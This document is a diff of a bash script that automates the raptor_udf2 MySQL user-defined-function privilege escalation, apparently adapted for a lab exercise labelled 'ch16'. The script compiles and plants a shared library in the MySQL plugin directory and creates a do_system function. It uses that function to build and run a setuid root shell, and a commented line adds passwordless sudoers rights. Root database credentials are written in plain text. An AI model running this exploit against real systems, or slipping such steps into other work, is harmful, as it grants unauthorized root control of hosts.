@@ -1,10 +1,16 @@
 #! /bin/bash
 
-
 ## Credentials and Database details
-USER="root"
-PASS="darkshadow"
-DATABASE="Webapp"
+
+export DATABASE="ch16"
+
+cat > /tmp/my.cnf << EOF
+[client]
+user=root
+password=root@ISIntS
+EOF
+
+chmod 0700 /tmp/my.cnf
 
 ## Creating raptor_udf2.c file on /tmp/
 cat > /tmp/raptor_udf2.c << EOF
@@ -66,31 +72,31 @@ gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
 ## -- CREATE TABLE MySQLPrvSc(line blob);
 ## -- INSERT INTO MySQLPrvSc values(LOAD_FILE('/tmp/raptor_udf2.so'));
 ## 
-mysql -u $USER -p$PASS $DATABASE -e "CREATE TABLE MySQLPrvSc(line blob)" 2>&1
-mysql -u $USER -p$PASS $DATABASE -e "INSERT INTO MySQLPrvSc values(LOAD_FILE('/tmp/raptor_udf2.so'))" 2>&1
+mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "CREATE TABLE MySQLPrvSc(line blob)" 2>&1
+mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "INSERT INTO MySQLPrvSc values(LOAD_FILE('/tmp/raptor_udf2.so'))" 2>&1
 ##
 ## -- SELECT @@GLOBAL.plugin_dir;
 ## -- SELECT line FROM MySQLPrvSc INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';
 ##
-mysql -u $USER -p$PASS $DATABASE -e "SET @raptor_query = CONCAT('SELECT line FROM MySQLPrvSc INTO DUMPFILE ', 0x27, @@GLOBAL.plugin_dir,'raptor_udf2.so', 0x27); PREPARE raptor FROM @raptor_query; EXECUTE raptor; DEALLOCATE PREPARE raptor" 2>&1
-mysql -u $USER -p$PASS $DATABASE -e "DROP TABLE IF EXISTS MySQLPrvSc"
+mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "SET @raptor_query = CONCAT('SELECT line FROM MySQLPrvSc INTO DUMPFILE ', 0x27, @@GLOBAL.plugin_dir,'raptor_udf2.so', 0x27); PREPARE raptor FROM @raptor_query; EXECUTE raptor; DEALLOCATE PREPARE raptor" 2>&1
+mysql --defaults-extra-file=/tmp/my.cnf --database=$DATABASE -e "DROP TABLE IF EXISTS MySQLPrvSc"
 ##
 ## -- CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so';
 ##
-mysql -u $USER -p$PASS -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'" 2>&1
+mysql --defaults-extra-file=/tmp/my.cnf -e "CREATE FUNCTION do_system RETURNS INTEGER SONAME 'raptor_udf2.so'" 2>&1
 ##
 ## -- SELECT do_system('gcc -o /tmp/setuid /tmp/setuid.c');
 ##
-mysql -u $USER -p$PASS -e "SELECT do_system(\"gcc -o /tmp/setuid /tmp/setuid.c\")" 2>&1 >/dev/null
+mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"gcc -o /tmp/setuid /tmp/setuid.c\")" 2>&1 >/dev/null
 ##
 ## -- SELECT do_system('chmod u+s /tmp/setuid');
 ##
-mysql -u $USER -p$PASS -e "SELECT do_system(\"chmod u+s /tmp/setuid\")" 2>&1 >/dev/null
+mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"chmod u+s /tmp/setuid\")" 2>&1 >/dev/null
 ## Need to fix the below line in a better way to use something like -- rm (SELECT CONCAT(@@GLOBAL.plugin_dir, 'raptor_udf2.so'))
-mysql -u $USER -p$PASS -e "SELECT do_system(\"rm /usr/lib*/mysql/plugin/raptor_udf2.so\")"  2>&1 >/dev/null
-## mysql -u $USER -p$PASS -e "SELECT do_system(\"echo \"`whoami` ALL =(ALL) NOPASSWD: ALL\" >> /etc/sudoers\") 2>&1 >/dev/null
-mysql -u $USER -p$PASS -e "DROP FUNCTION IF EXISTS do_system;"
-mysql -u $USER -p$PASS -e "\!sh /tmp/setuid"
+mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"rm /usr/lib*/mysql/plugin/raptor_udf2.so\")"  2>&1 >/dev/null
+## mysql --defaults-extra-file=/tmp/my.cnf -e "SELECT do_system(\"echo \"`whoami` ALL =(ALL) NOPASSWD: ALL\" >> /etc/sudoers\") 2>&1 >/dev/null
+mysql --defaults-extra-file=/tmp/my.cnf -e "DROP FUNCTION IF EXISTS do_system;"
+mysql --defaults-extra-file=/tmp/my.cnf -e "\!sh /tmp/setuid"
 ##
 ## -- \!sh /tmp/setuid
 ##
